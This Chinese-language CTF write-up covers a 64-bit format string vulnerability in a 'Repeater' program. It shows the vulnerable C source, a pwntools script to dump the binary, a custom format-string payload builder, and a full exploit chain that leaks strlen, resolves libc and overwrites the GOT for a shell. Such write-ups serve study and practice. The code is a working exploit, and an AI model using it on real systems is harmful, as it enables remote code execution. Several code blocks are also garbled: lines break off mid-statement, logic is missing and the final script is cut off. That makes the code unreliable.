那么开始快乐的dump程序
**dump代码编写**
如果以文件尾作为dump结束的话,在挂载程序的时候可能出现无限泄露,可以考虑加上范围限制,这个要根据具体的情况考虑,这里暂时就无限泄露,ctrl+C断开
dump代码编写,其实有点头疼,因为其实对于数据处理来容易出现失误(输出的数据的尾巴,需要处理掉),网上有些博客上提供的dump脚本,有些都是错的...这里整理各位大佬的脚本,最后写出了一个比较合理的脚本
dump需要注意前面输出的内容,9个字节的Repeater:
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    context.log_level = 'debug'#critical/debug
    p = process("./stilltest")
    f = open("stilltestbin", "ab+")
    #f = open("64weiba", "ab+")
    begin = 0x400000
    offset = 0
    i=0
    p.recvuntil('Please tell me:')
    while True:#i 我发现问题出现在于printf函数的地址上,很多时候pwn题在载入的时候,这个函数的地址都会是被scanf
> printf函数给解析的,解析了他们地址上的特殊符号...所以这个真的不好用...只能最好找到替代品,puts函数,或者strlen函数...常见的是strlen函数和puts函数一直都是格式化字符串钟爱的使用漏洞点...
**源码**
    #include 
    #include 
    #include 
    #include 
    int main(void){
        //init
        setbuf(stdout,0);
        setbuf(stdin,0);
        setbuf(stderr,0);
        printf("Hello,I am a computer Repeater updated.\nAfter a lot of machine learning,I know that the essence of man is a reread machine!\n");
        printf("So I'll answer whatever you say!\n");
        char buf[257];
        char format[300];
        unsigned int len1 = 0;
        while(1){
            alarm(3);
            memset(buf,0,sizeof(char)*257);
            memset(format,0,sizeof(char)*300);
            printf("Please tell me:");
            read(0,buf,256);
            sprintf(format,"Repeater:%s\n",buf);
            len1 = strlen(format);
            if(len1 > 270){
                printf("what you input is really long!");
                exit(0);
            }
            printf(format);
        }
        printf("game over!\n");
        return 0;
    }
解题思路还是和32位一样:
找到strlen函数的地址,直接利用plt/got的知识,寻找到就行...
  * leak address
  * use LibcSearcher to find libc
  * getshell
**自己写的一个关键函数**
但是getshell cover覆盖地址的时候需要改变代码:(珍贵的反序函数代码用来把地址放在后面...纯手工冰粉,现做现卖...)
    def antitone_fmt_payload(offset, writes, numbwritten=0, write_size='byte'):
        config = {
            32 : {
                'byte': (4, 1, 0xFF, 'hh', 8),
                'short': (2, 2, 0xFFFF, 'h', 16),
                'int': (1, 4, 0xFFFFFFFF, '', 32)},
            64 : {
                'byte': (8, 1, 0xFF, 'hh', 8),
                'short': (4, 2, 0xFFFF, 'h', 16),
                'int': (2, 4, 0xFFFFFFFF, '', 32)
            }
        }
        if write_size not in ['byte', 'short', 'int']:
            log.error("write_size must be 'byte', 'short' or 'int'")
        number, step, mask, formatz, decalage = config[context.bits][write_size]
        payload = ""
        payload_last = ""
        for where,what in writes.items():
            for i in range(0,number*step,step):
                payload_last += pack(where+i)
        fmtCount = 0
        payload_forward = ""
        key_toadd = []
        key_offset_fmtCount = []
        for where,what in writes.items():
            for i in range(0,number):
                current = what & mask
                if numbwritten & mask >= decalage
                fmtCount += 1
        len1 = len(payload_forward)
        key_temp = []
        for i in range(len(key_offset_fmtCount)):
            key_temp.append(key_offset_fmtCount[i])
        x_add = 0
        y_add = 0
        while True:
            x_add = len1 / 8 + 1
            y_add = 8 - (len1 % 8)
            for i in range(len(key_temp)):
                key_temp[i] = key_offset_fmtCount[i] + x_add
            payload_temp = ""
            for i in range(0,number):
                if key_toadd[i] != 0:
                    payload_temp += "%{}c".format(key_toadd[i])
                payload_temp += "%{}${}n".format(key_temp[i], formatz)
            len2 = len(payload_temp)
            xchange = y_add - (len2 - len1)
            if xchange >= 0:
                payload = payload_temp + xchange*'a' + payload_last
                return payload;
            else:
                len1 = len2
**完整exp**
那么完整的exp对于增加了strlen函数的题目之后就是这样子了:
    #-*- coding:utf-8 –*-    from pwn import *
    import time
    from LibcSearcher import LibcSearcher
    #context.log_level='debug'
    #context(arch = 'i386', os = 'linux', log_level='debug')
    context(arch = 'amd64', os = 'linux', log_level='debug')
    #log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
    Debug = 1
    if Debug:
        io = process("./stilltest")
    else:
        io = remote('0.0.0.0',10003)
    def antitone_fmt_payload(offset, writes, numbwritten=0, write_size='byte'):
        config = {
            32 : {
                'byte': (4, 1, 0xFF, 'hh', 8),
                'short': (2, 2, 0xFFFF, 'h', 16),
                'int': (1, 4, 0xFFFFFFFF, '', 32)},
            64 : {
                'byte': (8, 1, 0xFF, 'hh', 8),
                'short': (4, 2, 0xFFFF, 'h', 16),
                'int': (2, 4, 0xFFFFFFFF, '', 32)
            }
        }
        if write_size not in ['byte', 'short', 'int']:
            log.error("write_size must be 'byte', 'short' or 'int'")
        number, step, mask, formatz, decalage = config[context.bits][write_size]
        payload = ""
        payload_last = ""
        for where,what in writes.items():
            for i in range(0,number*step,step):
                payload_last += pack(where+i)
        fmtCount = 0
        payload_forward = ""
        key_toadd = []
        key_offset_fmtCount = []
        for where,what in writes.items():
            for i in range(0,number):
                current = what & mask
                if numbwritten & mask >= decalage
                fmtCount += 1